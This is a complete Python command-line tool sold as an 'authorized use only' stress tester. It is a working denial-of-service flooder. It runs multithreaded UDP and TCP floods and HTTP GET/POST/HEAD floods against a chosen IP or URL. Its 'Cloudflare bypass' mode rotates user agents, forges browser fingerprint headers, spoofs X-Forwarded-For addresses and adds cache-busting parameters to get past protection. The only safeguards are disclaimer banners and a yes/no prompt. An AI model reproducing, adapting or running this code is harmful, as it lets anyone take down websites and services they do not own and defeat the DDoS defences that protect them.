#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║              STRESS TESTER - AUTHORIZED USE ONLY                 ║
║     Only use on systems you own or have explicit permission to    ║
╚══════════════════════════════════════════════════════════════════╝

Supports: UDP Flood | TCP Flood | HTTP Layer 7 | Cloudflare Bypass
"""

import socket
import threading
import time
import random
import string
import sys
import os
import argparse
import signal
from datetime import datetime

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

# ──────────────────────────────────────────────
#  COLORS
# ──────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

def banner():
    print(f"""
{C.CYAN}{C.BOLD}
 ███████╗████████╗██████╗ ███████╗███████╗███████╗
 ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝
 ███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗
 ╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║
 ███████║   ██║   ██║  ██║███████╗███████║███████║
 ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

 {C.YELLOW}T E S T E R  v1.0  —  UDP | TCP | HTTP L7 | CF-Bypass{C.RESET}
{C.RED}{C.BOLD}
 ⚠  Use ONLY on your own systems or with explicit written permission.
 ⚠  Unauthorized use is illegal and unethical.
{C.RESET}""")

def log(level, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    icons = {"INFO": f"{C.CYAN}[*]", "OK": f"{C.GREEN}[+]", "WARN": f"{C.YELLOW}[!]",
             "ERR": f"{C.RED}[-]", "STAT": f"{C.BLUE}[~]"}
    icon = icons.get(level, f"{C.WHITE}[ ]")
    print(f"{C.DIM}{ts}{C.RESET} {icon} {msg}{C.RESET}")

# ──────────────────────────────────────────────
#  SHARED STATE
# ──────────────────────────────────────────────
stats = {
    "sent": 0,
    "bytes": 0,
    "errors": 0,
    "start": 0.0,
    "running": True,
}
stats_lock = threading.Lock()

def inc(sent=0, byt=0, err=0):
    with stats_lock:
        stats["sent"]  += sent
        stats["bytes"] += byt
        stats["errors"] += err

def format_bytes(b):
    for u in ["B", "KB", "MB", "GB"]:
        if b < 1024:
            return f"{b:.1f} {u}"
        b /= 1024
    return f"{b:.1f} TB"

def stats_printer(duration):
    while stats["running"]:
        elapsed = time.time() - stats["start"]
        remaining = max(0, duration - elapsed)
        with stats_lock:
            s = stats["sent"]
            by = stats["bytes"]
            er = stats["errors"]
        rps = s / elapsed if elapsed > 0 else 0
        bps = by / elapsed if elapsed > 0 else 0
        print(
            f"\r{C.BOLD}{C.GREEN}Sent: {s:,}{C.RESET} | "
            f"{C.CYAN}Errors: {er:,}{C.RESET} | "
            f"{C.YELLOW}Rate: {rps:.0f} req/s{C.RESET} | "
            f"{C.BLUE}BW: {format_bytes(bps)}/s{C.RESET} | "
            f"{C.WHITE}Elapsed: {elapsed:.0f}s / {duration}s  {C.RESET}",
            end="", flush=True
        )
        time.sleep(0.5)
    print()

# ──────────────────────────────────────────────
#  UDP FLOOD
# ──────────────────────────────────────────────
def udp_worker(target_ip, port, packet_size, stop_event):
    payload = random._urandom(packet_size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target_ip, port))
            inc(sent=1, byt=len(payload))
        except Exception:
            inc(err=1)
    sock.close()

def udp_flood(target_ip, port, threads, duration, packet_size=1024):
    log("INFO", f"UDP Flood → {target_ip}:{port} | Threads: {threads} | Pkt: {packet_size}B | {duration}s")
    stop_event = threading.Event()
    workers = [threading.Thread(target=udp_worker,
                                args=(target_ip, port, packet_size, stop_event),
                                daemon=True)
               for _ in range(threads)]
    stats["start"] = time.time()
    for w in workers: w.start()
    sp = threading.Thread(target=stats_printer, args=(duration,), daemon=True)
    sp.start()
    time.sleep(duration)
    stop_event.set()
    stats["running"] = False
    for w in workers: w.join(timeout=2)
    sp.join(timeout=2)
    _final_stats()

# ──────────────────────────────────────────────
#  TCP FLOOD
# ──────────────────────────────────────────────
def tcp_worker(target_ip, port, stop_event):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, port))
            data = random._urandom(random.randint(256, 2048))
            s.send(data)
            inc(sent=1, byt=len(data))
            s.close()
        except Exception:
            inc(err=1)

def tcp_flood(target_ip, port, threads, duration):
    log("INFO", f"TCP Flood → {target_ip}:{port} | Threads: {threads} | {duration}s")
    stop_event = threading.Event()
    workers = [threading.Thread(target=tcp_worker,
                                args=(target_ip, port, stop_event),
                                daemon=True)
               for _ in range(threads)]
    stats["start"] = time.time()
    for w in workers: w.start()
    sp = threading.Thread(target=stats_printer, args=(duration,), daemon=True)
    sp.start()
    time.sleep(duration)
    stop_event.set()
    stats["running"] = False
    for w in workers: w.join(timeout=2)
    sp.join(timeout=2)
    _final_stats()

# ──────────────────────────────────────────────
#  HTTP LAYER 7  +  CLOUDFLARE BYPASS
# ──────────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/124.0 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://www.facebook.com/",
    "https://t.co/",
    "https://www.reddit.com/",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "bg-BG,bg;q=0.9,en-US;q=0.8,en;q=0.7",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
]

def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def build_headers(url, cf_bypass=False):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    if cf_bypass:
        # Mimic real browser fingerprint to pass CF challenge
        headers.update({
            "Referer": random.choice(REFERERS) + rand_str(),
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
            "X-Real-IP": ".".join(str(random.randint(1, 254)) for _ in range(4)),
        })
    return headers

def make_session():
    s = requests.Session()
    retry = Retry(total=0)
    adapter = HTTPAdapter(max_retries=retry)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s

def http_worker(url, method, cf_bypass, stop_event, use_cache_bust):
    session = make_session()
    while not stop_event.is_set():
        try:
            target = url
            if use_cache_bust:
                sep = "&" if "?" in url else "?"
                target = f"{url}{sep}_{rand_str()}={rand_str()}"
            headers = build_headers(url, cf_bypass)
            if method == "GET":
                r = session.get(target, headers=headers, timeout=8, allow_redirects=True, verify=False)
            elif method == "POST":
                payload = {rand_str(): rand_str(16) for _ in range(random.randint(2, 6))}
                r = session.post(target, data=payload, headers=headers, timeout=8, allow_redirects=True, verify=False)
            elif method == "HEAD":
                r = session.head(target, headers=headers, timeout=8, allow_redirects=True, verify=False)
            else:
                r = session.get(target, headers=headers, timeout=8, allow_redirects=True, verify=False)
            inc(sent=1, byt=len(r.content))
        except Exception:
            inc(err=1)

def http_flood(url, method, threads, duration, cf_bypass=False, cache_bust=True):
    if not REQUESTS_OK:
        log("ERR", "requests library not found. Install: pip install requests")
        return
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    mode = "CF-Bypass " if cf_bypass else ""
    log("INFO", f"HTTP L7 {mode}{method} → {url} | Threads: {threads} | {duration}s")
    if cf_bypass:
        log("WARN", "Cloudflare bypass mode: rotating UA + headers + XFF spoofing")
    stop_event = threading.Event()
    workers = [threading.Thread(target=http_worker,
                                args=(url, method, cf_bypass, stop_event, cache_bust),
                                daemon=True)
               for _ in range(threads)]
    stats["start"] = time.time()
    for w in workers: w.start()
    sp = threading.Thread(target=stats_printer, args=(duration,), daemon=True)
    sp.start()
    time.sleep(duration)
    stop_event.set()
    stats["running"] = False
    for w in workers: w.join(timeout=2)
    sp.join(timeout=2)
    _final_stats()

# ──────────────────────────────────────────────
#  FINAL STATS
# ──────────────────────────────────────────────
def _final_stats():
    elapsed = time.time() - stats["start"]
    s, by, er = stats["sent"], stats["bytes"], stats["errors"]
    rps = s / elapsed if elapsed > 0 else 0
    log("STAT", f"Done in {elapsed:.1f}s")
    log("STAT", f"Total sent : {s:,} requests")
    log("STAT", f"Total data : {format_bytes(by)}")
    log("STAT", f"Errors     : {er:,}")
    log("STAT", f"Avg rate   : {rps:.1f} req/s")

# ──────────────────────────────────────────────
#  INTERACTIVE MENU
# ──────────────────────────────────────────────
def ask(prompt, default=None, cast=str):
    if default is not None:
        full_prompt = f"{C.CYAN}{prompt}{C.RESET} [{C.YELLOW}{default}{C.RESET}]: "
    else:
        full_prompt = f"{C.CYAN}{prompt}{C.RESET}: "
    val = input(full_prompt).strip()
    if val == "" and default is not None:
        return default
    try:
        return cast(val)
    except ValueError:
        log("ERR", f"Invalid value, using default: {default}")
        return default

def confirm(msg):
    r = input(f"{C.RED}{C.BOLD}  {msg} [yes/no]{C.RESET}: ").strip().lower()
    return r in ("yes", "y", "da", "да")

def interactive_menu():
    banner()
    print(f"{C.BOLD}{C.WHITE}Select attack type:{C.RESET}")
    print(f"  {C.GREEN}1{C.RESET} — UDP Flood")
    print(f"  {C.GREEN}2{C.RESET} — TCP Flood")
    print(f"  {C.GREEN}3{C.RESET} — HTTP Layer 7  (GET/POST/HEAD)")
    print(f"  {C.GREEN}4{C.RESET} — HTTP Layer 7  + Cloudflare Bypass")
    print(f"  {C.RED}0{C.RESET} — Exit\n")
    choice = ask("Choice", "1")

    # Disclaimer confirmation
    print(f"\n{C.RED}{C.BOLD}  ⚠  DISCLAIMER{C.RESET}")
    print(f"{C.YELLOW}  You MUST own the target or have written permission to test it.")
    print(f"  Unauthorized stress testing is illegal in most countries.{C.RESET}\n")
    if not confirm("I own the target and accept all responsibility"):
        log("WARN", "Aborted.")
        sys.exit(0)

    print()
    if choice in ("1", "2"):
        target = ask("Target IP")
        port   = ask("Port", 80, int)
        threads = ask("Threads", 100, int)
        duration = ask("Duration (seconds)", 30, int)

        # Reset stats
        stats.update({"sent": 0, "bytes": 0, "errors": 0, "running": True})

        if choice == "1":
            pkt = ask("Packet size (bytes)", 1024, int)
            udp_flood(target, port, threads, duration, pkt)
        else:
            tcp_flood(target, port, threads, duration)

    elif choice in ("3", "4"):
        url    = ask("Target URL (e.g. https://example.com/page)")
        method = ask("Method", "GET").upper()
        threads = ask("Threads", 150, int)
        duration = ask("Duration (seconds)", 30, int)
        cf = choice == "4"
        cache_bust = ask("Cache bust query params? (y/n)", "y").lower() in ("y", "yes", "da", "да")

        stats.update({"sent": 0, "bytes": 0, "errors": 0, "running": True})
        http_flood(url, method, threads, duration, cf_bypass=cf, cache_bust=cache_bust)

    elif choice == "0":
        log("INFO", "Goodbye.")
        sys.exit(0)
    else:
        log("ERR", "Unknown choice.")

# ──────────────────────────────────────────────
#  CLI MODE
# ──────────────────────────────────────────────
def cli_mode():
    parser = argparse.ArgumentParser(
        description="Stress Tester — authorized use only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 stress_tester.py --mode udp  --target 192.168.1.1 --port 80  --threads 200 --duration 30
  python3 stress_tester.py --mode tcp  --target 192.168.1.1 --port 443 --threads 100 --duration 60
  python3 stress_tester.py --mode http --url https://mysite.com --threads 150 --duration 30
  python3 stress_tester.py --mode http --url https://mysite.com --cf-bypass --threads 200 --duration 60
        """)
    parser.add_argument("--mode",      choices=["udp","tcp","http"], required=True)
    parser.add_argument("--target",    help="Target IP (UDP/TCP)")
    parser.add_argument("--port",      type=int, default=80)
    parser.add_argument("--url",       help="Target URL (HTTP)")
    parser.add_argument("--method",    default="GET", choices=["GET","POST","HEAD"])
    parser.add_argument("--threads",   type=int, default=100)
    parser.add_argument("--duration",  type=int, default=30)
    parser.add_argument("--pkt-size",  type=int, default=1024)
    parser.add_argument("--cf-bypass", action="store_true")
    parser.add_argument("--no-cache-bust", action="store_true")
    args = parser.parse_args()

    banner()
    print(f"{C.RED}{C.BOLD}  ⚠  By running this tool you confirm you own/have permission for the target.{C.RESET}\n")

    stats.update({"sent": 0, "bytes": 0, "errors": 0, "running": True})

    if args.mode == "udp":
        if not args.target:
            log("ERR", "--target is required for UDP mode"); sys.exit(1)
        udp_flood(args.target, args.port, args.threads, args.duration, args.pkt_size)
    elif args.mode == "tcp":
        if not args.target:
            log("ERR", "--target is required for TCP mode"); sys.exit(1)
        tcp_flood(args.target, args.port, args.threads, args.duration)
    elif args.mode == "http":
        if not args.url:
            log("ERR", "--url is required for HTTP mode"); sys.exit(1)
        http_flood(args.url, args.method, args.threads, args.duration,
                   cf_bypass=args.cf_bypass, cache_bust=not args.no_cache_bust)

# ──────────────────────────────────────────────
#  ENTRY POINT
# ──────────────────────────────────────────────
def graceful_exit(sig, frame):
    print(f"\n{C.YELLOW}[!] Interrupted — finalising...{C.RESET}")
    stats["running"] = False
    time.sleep(0.8)
    _final_stats()
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, graceful_exit)
    if len(sys.argv) > 1:
        cli_mode()
    else:
        interactive_menu()
